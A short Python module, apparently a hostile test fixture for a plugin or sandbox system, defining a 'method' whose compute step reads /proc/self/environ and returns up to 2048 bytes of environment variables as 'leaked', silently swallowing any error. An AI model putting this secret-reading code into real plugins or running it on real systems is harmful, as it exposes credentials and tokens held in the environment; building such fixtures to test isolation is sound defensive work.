"""Hostile: read /proc/self/environ (Linux) to recover secrets via the kernel."""
class _Proc:
    name = "proc_environ"; version = "0.0.0"; params_type = dict; required_inputs = ()
    def compute(self, dataset, params):
        leaked = None
        try:
            with open("/proc/self/environ", "rb") as fh:
                leaked = fh.read(2048).decode("latin1")
        except BaseException:
            pass
        return {"leaked": leaked}
method = _Proc()
